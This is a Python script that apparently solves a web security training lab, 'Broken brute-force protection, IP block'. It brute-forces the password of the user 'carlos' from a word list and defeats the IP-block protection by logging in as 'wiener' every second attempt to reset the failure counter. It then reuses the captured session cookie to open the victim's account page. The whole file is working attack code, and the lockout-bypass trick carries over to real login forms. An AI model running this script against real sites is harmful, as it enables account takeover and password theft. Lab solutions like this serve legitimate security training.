import requests
import time
from colorama import Fore

LAB_NAME = "Broken brute-force protection, IP block"
SCRIPT_START_TIME = time.time()
NEW_CARLOS_PASSWORD = "mystic_mido"

def run(url, payload=None, proxies=None):
    url = url.rstrip('/')
    print("⦗1⦘ Reading password list.. ", end="", flush=True)

    password_list = read_password_list("passwords.txt")
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗2⦘ Brute forcing carlos password..")  
    
    valid_session = brute_force_password(url, password_list, proxies)

    if valid_session:
        print(Fore.WHITE + "⦗3⦘ Fetching carlos profile.. ", end="", flush=True)
        cookies = { "session": valid_session }
        fetch(url, "/my-account", cookies, proxies)
        print_finish_message()
        return True
    else:  
        print(Fore.RED + "⦗!⦘ No valid passwords were found")
        return False

def read_password_list(file_path):
    try:
        return open(file_path, 'rt').read().splitlines()
    except:
        print(Fore.RED + "⦗!⦘ Failed to open the file " + file_path)
        exit(1)

def brute_force_password(url, password_list, proxies):
    for (counter, password) in enumerate(password_list):
        if counter % 2 == 0:
            data = { "username": "wiener", "password": "peter" }
            login = post_data(url, "/login", data, proxies)
            if login and login.ok:
                print(Fore.WHITE + "\n⦗#⦘ Making a successful login.. " + Fore.GREEN + "OK")
        
        print_progress(counter, len(password_list), password)
        data = { "username": "carlos", "password": password }
        login = post_data(url, "/login", data, proxies)

        if login and login.status_code == 302:
            session_cookie = login.cookies.get("session")
            print(Fore.WHITE + f"\n🗹 Correct password: " + Fore.GREEN + password)
            return session_cookie

    return None

def post_data(url, path, data, proxies=None, cookies=None):
    try:    
        return requests.post(f"{url}{path}", data=data, cookies=cookies, proxies=proxies, allow_redirects=False, verify=False)
    except Exception as e:
        print(Fore.RED + f"\n⦗!⦘ Failed to POST to {path}: {e}")

def fetch(url, path, cookies=None, proxies=None):
    try:  
        r = requests.get(f"{url}{path}", cookies=cookies, proxies=proxies, allow_redirects=False, verify=False)
        if r.ok:
            print(Fore.GREEN + "OK")
        else:
            print(Fore.RED + f"Failed. Status code: {r.status_code}")
        return r
    except Exception as e:
        print(Fore.RED + f"\n⦗!⦘ Failed to GET {path}: {e}")

def print_progress(counter, total_counts, text):
    elapsed = int(time.time() - SCRIPT_START_TIME)
    print(Fore.WHITE + f"Elapsed: {elapsed}s || Trying ({counter+1}/{total_counts}): " + Fore.BLUE + f"{text:50}", end='\r', flush=True)

def print_finish_message():
    elapsed = int(time.time() - SCRIPT_START_TIME)
    print("\n" + Fore.GREEN + "OK")
    print(Fore.WHITE + f"Finished in: {elapsed} seconds")
